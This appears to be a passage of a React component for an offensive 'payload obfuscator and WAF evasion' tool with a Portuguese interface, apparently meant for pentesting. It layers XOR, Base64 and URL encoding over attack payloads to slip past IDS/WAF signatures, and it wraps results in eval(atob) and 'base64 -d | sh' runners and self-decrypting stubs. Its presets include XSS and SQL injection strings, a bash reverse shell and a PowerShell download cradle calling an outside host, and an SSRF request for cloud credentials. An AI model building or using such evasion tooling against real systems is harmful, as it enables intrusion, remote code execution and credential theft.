import React, { useState, useMemo } from 'react';
import { 
  Lock, 
  Key, 
  Copy, 
  Check, 
  RotateCcw, 
  Sliders, 
  Layers, 
  Code2, 
  Terminal, 
  Search, 
  ShieldAlert, 
  Zap, 
  ArrowRight, 
  Sparkles, 
  FileText,
  Activity,
  CheckCircle2,
  AlertTriangle,
  Flame,
  Globe,
  Binary,
  Radio,
  RefreshCw
} from 'lucide-react';
import { 
  parseXorKey, 
  xorTransform, 
  xorTransformBytes, 
  bytesToHex, 
  bytesToBase64, 
  base64ToBytes, 
  hexToBytes, 
  applyUrlEncode, 
  bruteForceSingleByteXor, 
  runObfuscationPipeline, 
  generateSelfDecryptingStub,
  ObfuscationPipelineOption,
  XorBruteResult
} from '../utils/xorObfuscator';
import { calculateShannonEntropy } from '../utils/encoderMultiTool';

type ObfuscatorTab = 'CORE_MATRICES' | 'CHAINED_PIPELINE' | 'XOR_BRUTE_FORCE' | 'STUBS';

const QUICK_OBFUSCATION_PAYLOADS = [
  {
    name: 'XSS SVG Onload',
    category: 'XSS',
    payload: '<svg onload=alert(document.domain)>'
  },
  {
    name: 'SQLi Union Hex',
    category: 'SQLi',
    payload: "1' UNION SELECT 1,0x61646d696e,password FROM users--"
  },
  {
    name: 'Bash Reverse Shell',
    category: 'RCE',
    payload: 'bash -i >& /dev/tcp/10.10.14.5/4444 0>&1'
  },
  {
    name: 'PowerShell DownloadCradle',
    category: 'RCE',
    payload: 'IEX(New-Object Net.WebClient).DownloadString("http://10.10.14.5/shell.ps1")'
  },
  {
    name: 'SSRF AWS Metadata',
    category: 'SSRF',
    payload: 'http://169.254.169.254/latest/meta-data/iam/security-credentials/'
  }
];

export const PayloadObfuscatorStudio: React.FC = () => {
  const [activeTab, setActiveTab] = useState<ObfuscatorTab>('CORE_MATRICES');
  const [inputPayload, setInputPayload] = useState<string>(QUICK_OBFUSCATION_PAYLOADS[0].payload);
  const [copiedKey, setCopiedKey] = useState<string | null>(null);

  // XOR settings
  const [xorKeyString, setXorKeyString] = useState<string>('0x5A');
  const [xorKeyType, setXorKeyType] = useState<'text' | 'hex' | 'byte'>('hex');
  const [xorByteSlider, setXorByteSlider] = useState<number>(0x5a);

  // URL settings
  const [urlMode, setUrlMode] = useState<'standard' | 'double' | 'full' | 'special_only'>('double');

  // Base64 settings
  const [base64Mode, setBase64Mode] = useState<'standard' | 'url_safe' | 'eval_js'>('standard');

  // Chained Pipeline Options
  const [pipelineOptions, setPipelineOptions] = useState<ObfuscationPipelineOption>({
    useXor: true,
    xorKey: '0x5A',
    xorKeyType: 'hex',
    useBase64: true,
    base64Mode: 'standard',
    useUrlEncode: true,
    urlMode: 'standard'
  });

  // XOR Brute Force / Decoder
  const [bruteInput, setBruteInput] = useState<string>('1b3c373d32103f3e3c3f31103f323b323c34103a3f333f3930113e');
  const [bruteInputFormat, setBruteInputFormat] = useState<'hex' | 'base64'>('hex');

  // Stub language
  const [stubLanguage, setStubLanguage] = useState<'python' | 'javascript' | 'bash' | 'powershell'>('python');

  const handleCopy = (key: string, text: string) => {
    navigator.clipboard.writeText(text);
    setCopiedKey(key);
    setTimeout(() => setCopiedKey(null), 2000);
  };

  // Parse active XOR Key
  const activeKeyBytes = useMemo(() => {
    return parseXorKey(xorKeyString, xorKeyType);
  }, [xorKeyString, xorKeyType]);

  // XOR Transformations
  const xorResults = useMemo(() => {
    try {
      const encryptedBytes = xorTransform(inputPayload, activeKeyBytes);
      const hexSlashX = bytesToHex(encryptedBytes, 'slashX');
      const hex0x = bytesToHex(encryptedBytes, '0x');
      const hexRaw = bytesToHex(encryptedBytes, 'raw');
      const hexSpace = bytesToHex(encryptedBytes, 'space');
      const b64 = bytesToBase64(encryptedBytes, false);
      const b64Url = bytesToBase64(encryptedBytes, true);

      // Verify reversible
      const decryptedBytes = xorTransformBytes(encryptedBytes, activeKeyBytes);
      const decryptedText = new TextDecoder().decode(decryptedBytes);

      return {
        encryptedBytes,
        hexSlashX,
        hex0x,
        hexRaw,
        hexSpace,
        b64,
        b64Url,
        decryptedText,
        entropy: calculateShannonEntropy(hexRaw)
      };
    } catch {
      return {
        encryptedBytes: new Uint8Array(),
        hexSlashX: 'Error',
        hex0x: 'Error',
        hexRaw: 'Error',
        hexSpace: 'Error',
        b64: 'Error',
        b64Url: 'Error',
        decryptedText: 'Error',
        entropy: 0
      };
    }
  }, [inputPayload, activeKeyBytes]);

  // Base64 Transformations
  const base64Results = useMemo(() => {
    try {
      const utf8Bytes = encodeURIComponent(inputPayload).replace(/%([0-9A-F]{2})/g, (_, p1) =>
        String.fromCharCode(parseInt(p1, 16))
      );
      const standard = btoa(utf8Bytes);
      const urlSafe = standard.replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, '');
      const evalJs = `eval(atob('${standard}'))`;
      const bashPipe = `echo '${standard}' | base64 -d | sh`;
      return { standard, urlSafe, evalJs, bashPipe };
    } catch {
      return { standard: 'Error', urlSafe: 'Error', evalJs: 'Error', bashPipe: 'Error' };
    }
  }, [inputPayload]);

  // URL Transformations
  const urlResults = useMemo(() => {
    const standard = applyUrlEncode(inputPayload, 'standard');
    const double = applyUrlEncode(inputPayload, 'double');
    const full = applyUrlEncode(inputPayload, 'full');
    const special = applyUrlEncode(inputPayload, 'special_only');
    return { standard, double, full, special };
  }, [inputPayload]);

  // Chained Pipeline Execution
  const pipelineExecution = useMemo(() => {
    return runObfuscationPipeline(inputPayload, pipelineOptions);
  }, [inputPayload, pipelineOptions]);

  // Brute Force Single-Byte XOR Scanner
  const bruteForceCandidates = useMemo(() => {
    if (!bruteInput.trim()) return [];
    try {
      let rawBytes: Uint8Array;
      if (bruteInputFormat === 'hex') {
        rawBytes = hexToBytes(bruteInput);
      } else {
        rawBytes = base64ToBytes(bruteInput);
      }
      return bruteForceSingleByteXor(rawBytes, 8);
    } catch {
      return [];
    }
  }, [bruteInput, bruteInputFormat]);

  // Runtime Stub Generation
  const runtimeStubCode = useMemo(() => {
    return generateSelfDecryptingStub(stubLanguage, inputPayload, xorKeyString);
  }, [stubLanguage, inputPayload, xorKeyString]);

  const inputEntropy = useMemo(() => {
    return calculateShannonEntropy(inputPayload);
  }, [inputPayload]);

  return (
    <div className="space-y-6">
      {/* Top Banner Header */}
      <div className="bg-[#121218] border border-[#22222d] rounded-2xl p-5 sm:p-6 shadow-xl relative overflow-hidden">
        <div className="absolute -right-8 -top-8 w-60 h-60 bg-amber-500/5 rounded-full blur-3xl pointer-events-none" />
        <div className="flex flex-col lg:flex-row lg:items-center justify-between gap-5">
          <div className="space-y-1.5">
            <div className="flex items-center gap-2 flex-wrap">
              <span className="px-2.5 py-0.5 rounded-full bg-amber-500/15 border border-amber-500/30 text-amber-400 font-mono text-xs font-bold flex items-center gap-1.5">
                <Lock className="w-3.5 h-3.5" />
                <span>Payload Obfuscator & Evasion Studio</span>
              </span>
              <span className="text-zinc-500 text-xs">•</span>
              <span className="text-zinc-400 font-mono text-xs">XOR Encryption • Base64 • URL Encoding</span>
            </div>
            <h2 className="text-xl sm:text-2xl font-bold tracking-tight text-white flex items-center gap-2.5">
              <span>Laboratório de Ofuscação de Payloads & Evasão WAF</span>
            </h2>
            <p className="text-xs sm:text-sm text-zinc-400 max-w-3xl leading-relaxed">
              Criptografe e codifique cargas de ataque com <strong className="text-zinc-200">Cifra XOR (single-byte e chave contínua)</strong>, <strong className="text-zinc-200">Base64 (Standard/URL-safe/JS inline)</strong> e <strong className="text-zinc-200">URL Encoding (Duplo/Full %XX)</strong>. Combine múltiplas camadas em um pipeline sequencial e teste auto-descriptografia para validação em pentests e auditorias AppSec.
            </p>
          </div>

          {/* Quick Metrics */}
          <div className="flex items-center gap-3 shrink-0 bg-[#161622] border border-[#262638] rounded-xl p-3">
            <div className="space-y-0.5">
              <div className="text-[10px] font-mono text-zinc-400 uppercase tracking-wider flex items-center gap-1">
                <Activity className="w-3 h-3 text-amber-400" />
                <span>Entropia do Payload</span>
              </div>
              <div className="text-lg font-black font-mono text-white flex items-baseline gap-1.5">
                <span>{inputEntropy}</span>
                <span className="text-[11px] text-zinc-500 font-normal">bits/byte</span>
              </div>
              <div className="text-[10px] font-mono text-amber-400 bg-amber-500/10 px-2 py-0.2 rounded border border-amber-500/20 inline-block">
                {inputPayload.length} chars • {new TextEncoder().encode(inputPayload).length} bytes
              </div>
            </div>
          </div>
        </div>

        {/* Navigation Tabs */}
        <div className="flex items-center gap-2 overflow-x-auto pt-5 mt-5 border-t border-[#1e1e28] scrollbar-none">
          <button
            type="button"
            onClick={() => setActiveTab('CORE_MATRICES')}
            className={`px-3.5 py-1.5 rounded-xl font-mono text-xs font-bold flex items-center gap-2 transition-all cursor-pointer whitespace-nowrap ${
              activeTab === 'CORE_MATRICES'
                ? 'bg-amber-500 text-black shadow-lg shadow-amber-950/50'
                : 'bg-[#171722] text-zinc-400 hover:text-zinc-200 hover:bg-[#1f1f2e] border border-[#242436]'
            }`}
          >
            <Sliders className="w-3.5 h-3.5" />
            <span>Matriz de Técnicas (XOR / B64 / URL)</span>
          </button>

          <button
            type="button"
            onClick={() => setActiveTab('CHAINED_PIPELINE')}
            className={`px-3.5 py-1.5 rounded-xl font-mono text-xs font-bold flex items-center gap-2 transition-all cursor-pointer whitespace-nowrap ${
              activeTab === 'CHAINED_PIPELINE'
                ? 'bg-amber-500 text-black shadow-lg shadow-amber-950/50'
                : 'bg-[#171722] text-zinc-400 hover:text-zinc-200 hover:bg-[#1f1f2e] border border-[#242436]'
            }`}
          >
            <Layers className="w-3.5 h-3.5" />
            <span>Pipeline Combinado (XOR + Base64 + URL)</span>
          </button>

          <button
            type="button"
            onClick={() => setActiveTab('XOR_BRUTE_FORCE')}
            className={`px-3.5 py-1.5 rounded-xl font-mono text-xs font-bold flex items-center gap-2 transition-all cursor-pointer whitespace-nowrap ${
              activeTab === 'XOR_BRUTE_FORCE'
                ? 'bg-amber-500 text-black shadow-lg shadow-amber-950/50'
                : 'bg-[#171722] text-zinc-400 hover:text-zinc-200 hover:bg-[#1f1f2e] border border-[#242436]'
            }`}
          >
            <Search className="w-3.5 h-3.5" />
            <span>Decodificador & Brute-Force XOR</span>
          </button>

          <button
            type="button"
            onClick={() => setActiveTab('STUBS')}
            className={`px-3.5 py-1.5 rounded-xl font-mono text-xs font-bold flex items-center gap-2 transition-all cursor-pointer whitespace-nowrap ${
              activeTab === 'STUBS'
                ? 'bg-amber-500 text-black shadow-lg shadow-amber-950/50'
                : 'bg-[#171722] text-zinc-400 hover:text-zinc-200 hover:bg-[#1f1f2e] border border-[#242436]'
            }`}
          >
            <Code2 className="w-3.5 h-3.5" />
            <span>Stubs de Auto-Descriptografia</span>
          </button>
        </div>
      </div>

      {/* Input Payload & Presets Carousel */}
      <div className="bg-[#121218] border border-[#22222d] rounded-2xl p-5 space-y-3 shadow-lg">
        <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-3 border-b border-[#1e1e28] pb-3">
          <div className="flex items-center gap-2">
            <Terminal className="w-4 h-4 text-amber-400" />
            <span className="text-xs font-mono font-bold text-white">Payload de Entrada para Ofuscação</span>
            <span className="text-[10px] font-mono px-2 py-0.5 rounded bg-zinc-800 text-zinc-400">
              {inputPayload.length} caracteres
            </span>
          </div>

          <div className="flex items-center gap-2">
            <button
              type="button"
              onClick={() => handleCopy('raw-input', inputPayload)}
              className="px-2.5 py-1 rounded-lg bg-[#1c1c28] hover:bg-[#28283a] text-zinc-300 text-xs font-mono flex items-center gap-1 border border-[#2a2a3c] transition-colors cursor-pointer"
            >
              {copiedKey === 'raw-input' ? <Check className="w-3 h-3 text-emerald-400" /> : <Copy className="w-3 h-3" />}
              <span>Copiar Entrada</span>
            </button>
            <button
              type="button"
              onClick={() => setInputPayload('')}
              className="px-2.5 py-1 rounded-lg bg-[#1c1c28] hover:bg-[#28283a] text-zinc-400 hover:text-zinc-200 text-xs font-mono transition-colors cursor-pointer"
            >
              Limpar
            </button>
          </div>
        </div>

        <textarea
          rows={3}
          value={inputPayload}
          onChange={e => setInputPayload(e.target.value)}
          placeholder="Cole aqui o payload bruto (SQLi, XSS, comando de shell ou string a ser ofuscada)..."
          className="w-full px-3.5 py-2.5 rounded-xl bg-[#0c0c10] border border-[#232330] text-amber-300 font-mono text-xs focus:outline-none focus:border-amber-500/50 resize-none leading-relaxed"
        />

        {/* Quick Presets */}
        <div className="pt-2 flex items-center gap-2 overflow-x-auto scrollbar-none">
          <span className="text-[10px] font-mono font-bold text-zinc-500 uppercase tracking-wider shrink-0">
            Amostras Rápidas:
          </span>
          {QUICK_OBFUSCATION_PAYLOADS.map((sample, idx) => (
            <button
              key={idx}
              type="button"
              onClick={() => setInputPayload(sample.payload)}
              className="px-2.5 py-1 rounded-lg bg-[#161622] hover:bg-[#202032] border border-[#252536] text-zinc-300 text-[11px] font-mono whitespace-nowrap transition-colors cursor-pointer flex items-center gap-1.5"
            >
              <span className="text-amber-400 text-[9px] font-bold">[{sample.category}]</span>
              <span>{sample.name}</span>
            </button>
          ))}
        </div>
      </div>

      {/* ========================================================================= */}
      {/* TAB 1: CORE MATRICES (XOR, BASE64, URL ENCODE) */}
      {/* ========================================================================= */}
      {activeTab === 'CORE_MATRICES' && (
        <div className="grid grid-cols-1 lg:grid-cols-3 gap-6">
          {/* SECTION 1: XOR ENCRYPTION */}
          <div className="space-y-4">
            <div className="flex items-center justify-between pb-1 border-b border-[#222230]">
              <h3 className="text-sm font-bold text-white flex items-center gap-2">
                <Lock className="w-4 h-4 text-amber-400" />
                <span>Criptografia XOR</span>
              </h3>
              <span className="text-[10px] font-mono text-amber-400 bg-amber-500/10 px-2 py-0.5 rounded border border-amber-500/20">
                Bitwise Cipher
              </span>
            </div>

            {/* XOR Key Controls Card */}
            <div className="bg-[#121218] border border-[#22222d] rounded-xl p-4 space-y-3">
              <div className="flex items-center justify-between">
                <label className="text-xs font-mono font-bold text-zinc-300 flex items-center gap-1.5">
                  <Key className="w-3.5 h-3.5 text-amber-400" />
                  <span>Chave de Cifra XOR:</span>
                </label>
                <div className="flex items-center gap-1">
                  {(['hex', 'text', 'byte'] as const).map(kt => (
                    <button
                      key={kt}
                      type="button"
                      onClick={() => setXorKeyType(kt)}
                      className={`px-2 py-0.5 rounded text-[10px] font-mono font-bold uppercase transition-all ${
                        xorKeyType === kt ? 'bg-amber-500 text-black' : 'bg-[#181824] text-zinc-400'
                      }`}
                    >
                      {kt}
                    </button>
                  ))}
                </div>
              </div>

              <input
                type="text"
                value={xorKeyString}
                onChange={e => {
                  setXorKeyString(e.target.value);
                  const parsed = parseXorKey(e.target.value, xorKeyType);
                  if (parsed.length > 0) setXorByteSlider(parsed[0]);
                }}
                placeholder={xorKeyType === 'hex' ? '0x5A ou 5A' : xorKeyType === 'byte' ? '42' : 'SECRET_KEY'}
                className="w-full bg-[#0c0c10] border border-[#232330] rounded-lg px-3 py-1.5 text-xs font-mono text-white focus:outline-none focus:border-amber-500/50"
              />

              {/* Single Byte Slider */}
              <div className="space-y-1 pt-1">
                <div className="flex items-center justify-between text-[11px] font-mono text-zinc-400">
                  <span>Byte Slider (0 - 255):</span>
                  <span className="text-amber-400 font-bold">
                    0x{xorByteSlider.toString(16).padStart(2, '0').toUpperCase()} ({xorByteSlider})
                  </span>
                </div>
                <input
                  type="range"
                  min="0"
                  max="255"
                  value={xorByteSlider}
                  onChange={e => {
                    const val = parseInt(e.target.value, 10);
                    setXorByteSlider(val);
                    setXorKeyString(`0x${val.toString(16).padStart(2, '0').toUpperCase()}`);
                    setXorKeyType('hex');
                  }}
                  className="w-full accent-amber-500 cursor-pointer"
                />
              </div>

              <div className="text-[10px] font-mono text-zinc-500 pt-1">
                Chave Ativa: [{activeKeyBytes.map(b => '0x' + b.toString(16).padStart(2, '0').toUpperCase()).join(', ')}] ({activeKeyBytes.length} byte{activeKeyBytes.length > 1 ? 's' : ''})
              </div>
            </div>

            {/* Output: XOR Base64 */}
            <div className="bg-[#121218] border border-[#22222d] rounded-xl p-3.5 space-y-2">
              <div className="flex items-center justify-between text-xs font-mono">
                <span className="text-zinc-300 font-bold">XOR Criptografado → Base64</span>
                <button
                  type="button"
                  onClick={() => handleCopy('xor-b64', xorResults.b64)}
                  className="text-zinc-400 hover:text-zinc-200 flex items-center gap-1"
                >
                  {copiedKey === 'xor-b64' ? <Check className="w-3 h-3 text-emerald-400" /> : <Copy className="w-3 h-3" />}
                  <span>Copiar</span>
                </button>
              </div>
              <pre className="p-2.5 rounded-lg bg-[#0c0c10] border border-[#1e1e28] text-amber-300 font-mono text-xs overflow-x-auto break-all">
                {xorResults.b64}
              </pre>
            </div>

            {/* Output: XOR Hex Escaped */}
            <div className="bg-[#121218] border border-[#22222d] rounded-xl p-3.5 space-y-2">
              <div className="flex items-center justify-between text-xs font-mono">
                <span className="text-zinc-300 font-bold">XOR Hex Escaped (\x..)</span>
                <button
                  type="button"
                  onClick={() => handleCopy('xor-hex', xorResults.hexSlashX)}
                  className="text-zinc-400 hover:text-zinc-200 flex items-center gap-1"
                >
                  {copiedKey === 'xor-hex' ? <Check className="w-3 h-3 text-emerald-400" /> : <Copy className="w-3 h-3" />}
                  <span>Copiar</span>
                </button>
              </div>
              <pre className="p-2.5 rounded-lg bg-[#0c0c10] border border-[#1e1e28] text-amber-300 font-mono text-xs overflow-x-auto break-all">
                {xorResults.hexSlashX}
              </pre>
            </div>

            {/* Output: XOR Reversible Verification */}
            <div className="bg-[#121218] border border-emerald-500/20 rounded-xl p-3 space-y-1.5">
              <div className="flex items-center justify-between text-[11px] font-mono text-emerald-400 font-bold">
                <span className="flex items-center gap-1">
                  <CheckCircle2 className="w-3.5 h-3.5" />
                  <span>Verificação Inversa (Decrypted == Input):</span>
                </span>
                <span className="text-[10px] text-zinc-500">100% Reversível</span>
              </div>
              <div className="p-2 rounded bg-[#0a0a0f] text-emerald-300 font-mono text-xs truncate">
                {xorResults.decryptedText}
              </div>
            </div>
          </div>

          {/* SECTION 2: BASE64 ENCODING */}
          <div className="space-y-4">
            <div className="flex items-center justify-between pb-1 border-b border-[#222230]">
              <h3 className="text-sm font-bold text-white flex items-center gap-2">
                <Binary className="w-4 h-4 text-purple-400" />
                <span>Codificação Base64</span>
              </h3>
              <span className="text-[10px] font-mono text-purple-400 bg-purple-500/10 px-2 py-0.5 rounded border border-purple-500/20">
                RFC 4648
              </span>
            </div>

            {/* Standard Base64 */}
            <div className="bg-[#121218] border border-[#22222d] rounded-xl p-3.5 space-y-2">
              <div className="flex items-center justify-between text-xs font-mono">
                <span className="text-zinc-300 font-bold">Base64 Standard</span>
                <button
                  type="button"
                  onClick={() => handleCopy('b64-std', base64Results.standard)}
                  className="text-zinc-400 hover:text-zinc-200 flex items-center gap-1"
                >
                  {copiedKey === 'b64-std' ? <Check className="w-3 h-3 text-emerald-400" /> : <Copy className="w-3 h-3" />}
                  <span>Copiar</span>
                </button>
              </div>
              <pre className="p-2.5 rounded-lg bg-[#0c0c10] border border-[#1e1e28] text-purple-300 font-mono text-xs overflow-x-auto break-all">
                {base64Results.standard}
              </pre>
            </div>

            {/* Base64 URL-Safe */}
            <div className="bg-[#121218] border border-[#22222d] rounded-xl p-3.5 space-y-2">
              <div className="flex items-center justify-between text-xs font-mono">
                <span className="text-zinc-300 font-bold">Base64URL Safe (- and _)</span>
                <button
                  type="button"
                  onClick={() => handleCopy('b64-url', base64Results.urlSafe)}
                  className="text-zinc-400 hover:text-zinc-200 flex items-center gap-1"
                >
                  {copiedKey === 'b64-url' ? <Check className="w-3 h-3 text-emerald-400" /> : <Copy className="w-3 h-3" />}
                  <span>Copiar</span>
                </button>
              </div>
              <pre className="p-2.5 rounded-lg bg-[#0c0c10] border border-[#1e1e28] text-purple-300 font-mono text-xs overflow-x-auto break-all">
                {base64Results.urlSafe}
              </pre>
            </div>

            {/* JavaScript Execution Inline Wrapper */}
            <div className="bg-[#121218] border border-[#22222d] rounded-xl p-3.5 space-y-2">
              <div className="flex items-center justify-between text-xs font-mono">
                <span className="text-zinc-300 font-bold">JavaScript eval(atob(...))</span>
                <button
                  type="button"
                  onClick={() => handleCopy('b64-eval', base64Results.evalJs)}
                  className="text-zinc-400 hover:text-zinc-200 flex items-center gap-1"
                >
                  {copiedKey === 'b64-eval' ? <Check className="w-3 h-3 text-emerald-400" /> : <Copy className="w-3 h-3" />}
                  <span>Copiar</span>
                </button>
              </div>
              <pre className="p-2.5 rounded-lg bg-[#0c0c10] border border-[#1e1e28] text-purple-300 font-mono text-xs overflow-x-auto break-all">
                {base64Results.evalJs}
              </pre>
            </div>

            {/* Linux Bash Pipeline Execution Wrapper */}
            <div className="bg-[#121218] border border-[#22222d] rounded-xl p-3.5 space-y-2">
              <div className="flex items-center justify-between text-xs font-mono">
                <span className="text-zinc-300 font-bold">Bash Pipeline (base64 -d | sh)</span>
                <button
                  type="button"
                  onClick={() => handleCopy('b64-bash', base64Results.bashPipe)}
                  className="text-zinc-400 hover:text-zinc-200 flex items-center gap-1"
                >
                  {copiedKey === 'b64-bash' ? <Check className="w-3 h-3 text-emerald-400" /> : <Copy className="w-3 h-3" />}
                  <span>Copiar</span>
                </button>
              </div>
              <pre className="p-2.5 rounded-lg bg-[#0c0c10] border border-[#1e1e28] text-purple-300 font-mono text-xs overflow-x-auto break-all">
                {base64Results.bashPipe}
              </pre>
            </div>
          </div>

          {/* SECTION 3: URL ENCODING */}
          <div className="space-y-4">
            <div className="flex items-center justify-between pb-1 border-b border-[#222230]">
              <h3 className="text-sm font-bold text-white flex items-center gap-2">
                <Globe className="w-4 h-4 text-cyan-400" />
                <span>Codificação URL</span>
              </h3>
              <span className="text-[10px] font-mono text-cyan-400 bg-cyan-500/10 px-2 py-0.5 rounded border border-cyan-500/20">
                WAF Evasion
              </span>
            </div>

            {/* Double URL Encode */}
            <div className="bg-[#121218] border border-[#22222d] rounded-xl p-3.5 space-y-2">
              <div className="flex items-center justify-between text-xs font-mono">
                <span className="text-zinc-300 font-bold">Double URL Encode (%2520)</span>
                <button
                  type="button"
                  onClick={() => handleCopy('url-double', urlResults.double)}
                  className="text-zinc-400 hover:text-zinc-200 flex items-center gap-1"
                >
                  {copiedKey === 'url-double' ? <Check className="w-3 h-3 text-emerald-400" /> : <Copy className="w-3 h-3" />}
                  <span>Copiar</span>
                </button>
              </div>
              <pre className="p-2.5 rounded-lg bg-[#0c0c10] border border-[#1e1e28] text-cyan-300 font-mono text-xs overflow-x-auto break-all">
                {urlResults.double}
              </pre>
            </div>

            {/* Full URL Encode */}
            <div className="bg-[#121218] border border-[#22222d] rounded-xl p-3.5 space-y-2">
              <div className="flex items-center justify-between text-xs font-mono">
                <span className="text-zinc-300 font-bold">Full URL Encode (100% Chars %XX)</span>
                <button
                  type="button"
                  onClick={() => handleCopy('url-full', urlResults.full)}
                  className="text-zinc-400 hover:text-zinc-200 flex items-center gap-1"
                >
                  {copiedKey === 'url-full' ? <Check className="w-3 h-3 text-emerald-400" /> : <Copy className="w-3 h-3" />}
                  <span>Copiar</span>
                </button>
              </div>
              <pre className="p-2.5 rounded-lg bg-[#0c0c10] border border-[#1e1e28] text-cyan-300 font-mono text-xs overflow-x-auto break-all">
                {urlResults.full}
              </pre>
            </div>

            {/* Standard URL Encode */}
            <div className="bg-[#121218] border border-[#22222d] rounded-xl p-3.5 space-y-2">
              <div className="flex items-center justify-between text-xs font-mono">
                <span className="text-zinc-300 font-bold">Standard URL Encode</span>
                <button
                  type="button"
                  onClick={() => handleCopy('url-std', urlResults.standard)}
                  className="text-zinc-400 hover:text-zinc-200 flex items-center gap-1"
                >
                  {copiedKey === 'url-std' ? <Check className="w-3 h-3 text-emerald-400" /> : <Copy className="w-3 h-3" />}
                  <span>Copiar</span>
                </button>
              </div>
              <pre className="p-2.5 rounded-lg bg-[#0c0c10] border border-[#1e1e28] text-cyan-300 font-mono text-xs overflow-x-auto break-all">
                {urlResults.standard}
              </pre>
            </div>

            {/* Special Metachars Only */}
            <div className="bg-[#121218] border border-[#22222d] rounded-xl p-3.5 space-y-2">
              <div className="flex items-center justify-between text-xs font-mono">
                <span className="text-zinc-300 font-bold">Metacaracteres Especiais Only</span>
                <button
                  type="button"
                  onClick={() => handleCopy('url-spec', urlResults.special)}
                  className="text-zinc-400 hover:text-zinc-200 flex items-center gap-1"
                >
                  {copiedKey === 'url-spec' ? <Check className="w-3 h-3 text-emerald-400" /> : <Copy className="w-3 h-3" />}
                  <span>Copiar</span>
                </button>
              </div>
              <pre className="p-2.5 rounded-lg bg-[#0c0c10] border border-[#1e1e28] text-cyan-300 font-mono text-xs overflow-x-auto break-all">
                {urlResults.special}
              </pre>
            </div>
          </div>
        </div>
      )}

      {/* ========================================================================= */}
      {/* TAB 2: CHAINED PIPELINE (XOR -> BASE64 -> URL) */}
      {/* ========================================================================= */}
      {activeTab === 'CHAINED_PIPELINE' && (
        <div className="space-y-6">
          {/* Pipeline Configuration Control Box */}
          <div className="bg-[#121218] border border-[#22222d] rounded-2xl p-5 space-y-4 shadow-lg">
            <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-3 border-b border-[#1e1e28] pb-3">
              <div className="space-y-0.5">
                <h3 className="text-sm font-bold text-white flex items-center gap-2">
                  <Layers className="w-4 h-4 text-amber-400" />
                  <span>Configuração do Pipeline Combinado de Evasão</span>
                </h3>
                <p className="text-xs text-zinc-400">
                  Combine Cifra XOR, Base64 e Codificação URL em série para simular tráfego furtivo e bypass de assinaturas IDS/WAF.
                </p>
              </div>

              <button
                type="button"
                onClick={() => handleCopy('pipeline-final', pipelineExecution.finalOutput)}
                className="px-3 py-1.5 rounded-lg bg-amber-500 hover:bg-amber-400 text-black font-mono text-xs font-bold flex items-center gap-1.5 transition-colors cursor-pointer shadow-md"
              >
                {copiedKey === 'pipeline-final' ? <Check className="w-3.5 h-3.5" /> : <Copy className="w-3.5 h-3.5" />}
                <span>Copiar Payload Final Armado</span>
              </button>
            </div>

            {/* Toggle Switches for Each Stage */}
            <div className="grid grid-cols-1 md:grid-cols-3 gap-4 pt-1">
              {/* Stage 1: XOR */}
              <div className={`p-4 rounded-xl border transition-all ${
                pipelineOptions.useXor ? 'bg-[#181824] border-amber-500/40' : 'bg-[#101016] border-[#20202e] opacity-60'
              }`}>
                <div className="flex items-center justify-between mb-2">
                  <span className="text-xs font-bold text-white flex items-center gap-1.5">
                    <Lock className="w-3.5 h-3.5 text-amber-400" />
                    <span>Estágio 1: Cifra XOR</span>
                  </span>
                  <input
                    type="checkbox"
                    checked={pipelineOptions.useXor}
                    onChange={e => setPipelineOptions(prev => ({ ...prev, useXor: e.target.checked }))}
                    className="accent-amber-500 w-4 h-4 cursor-pointer"
                  />
                </div>
                {pipelineOptions.useXor && (
                  <div className="space-y-2 pt-1">
                    <label className="text-[10px] font-mono text-zinc-400">Chave XOR:</label>
                    <input
                      type="text"
                      value={pipelineOptions.xorKey}
                      onChange={e => setPipelineOptions(prev => ({ ...prev, xorKey: e.target.value }))}
                      className="w-full bg-[#0a0a0f] border border-[#2b2b3b] rounded-lg px-2.5 py-1 text-xs font-mono text-white"
                    />
                  </div>
                )}
              </div>

              {/* Stage 2: Base64 */}
              <div className={`p-4 rounded-xl border transition-all ${
                pipelineOptions.useBase64 ? 'bg-[#181824] border-purple-500/40' : 'bg-[#101016] border-[#20202e] opacity-60'
              }`}>
                <div className="flex items-center justify-between mb-2">
                  <span className="text-xs font-bold text-white flex items-center gap-1.5">
                    <Binary className="w-3.5 h-3.5 text-purple-400" />
                    <span>Estágio 2: Base64</span>
                  </span>
                  <input
                    type="checkbox"
                    checked={pipelineOptions.useBase64}
                    onChange={e => setPipelineOptions(prev => ({ ...prev, useBase64: e.target.checked }))}
                    className="accent-purple-500 w-4 h-4 cursor-pointer"
                  />
                </div>
                {pipelineOptions.useBase64 && (
                  <div className="space-y-2 pt-1">
                    <label className="text-[10px] font-mono text-zinc-400">Modo Base64:</label>
                    <select
                      value={pipelineOptions.base64Mode}
                      onChange={e => setPipelineOptions(prev => ({ ...prev, base64Mode: e.target.value as any }))}
                      className="w-full bg-[#0a0a0f] border border-[#2b2b3b] rounded-lg px-2 py-1 text-xs font-mono text-white"
                    >
                      <option value="standard">Standard (RFC 4648)</option>
                      <option value="url_safe">URL-Safe (- and _)</option>
                      <option value="eval_js">eval(atob(...))</option>
                    </select>
                  </div>
                )}
              </div>

              {/* Stage 3: URL Encode */}
              <div className={`p-4 rounded-xl border transition-all ${
                pipelineOptions.useUrlEncode ? 'bg-[#181824] border-cyan-500/40' : 'bg-[#101016] border-[#20202e] opacity-60'
              }`}>
                <div className="flex items-center justify-between mb-2">
                  <span className="text-xs font-bold text-white flex items-center gap-1.5">
                    <Globe className="w-3.5 h-3.5 text-cyan-400" />
                    <span>Estágio 3: URL Encode</span>
                  </span>
                  <input
                    type="checkbox"
                    checked={pipelineOptions.useUrlEncode}
                    onChange={e => setPipelineOptions(prev => ({ ...prev, useUrlEncode: e.target.checked }))}
                    className="accent-cyan-500 w-4 h-4 cursor-pointer"
                  />
                </div>
                {pipelineOptions.useUrlEncode && (
                  <div className="space-y-2 pt-1">
                    <label className="text-[10px] font-mono text-zinc-400">Modo URL:</label>
                    <select
                      value={pipelineOptions.urlMode}
                      onChange={e => setPipelineOptions(prev => ({ ...prev, urlMode: e.target.value as any }))}
                      className="w-full bg-[#0a0a0f] border border-[#2b2b3b] rounded-lg px-2 py-1 text-xs font-mono text-white"
                    >
                      <option value="standard">Standard (%20)</option>
                      <option value="double">Double URL (%2520)</option>
                      <option value="full">Full (%XX All Chars)</option>
                    </select>
                  </div>
                )}
              </div>
            </div>
          </div>

          {/* Sequential Step Execution Flow */}
          <div className="space-y-3">
            {pipelineExecution.steps.map((st, idx) => (
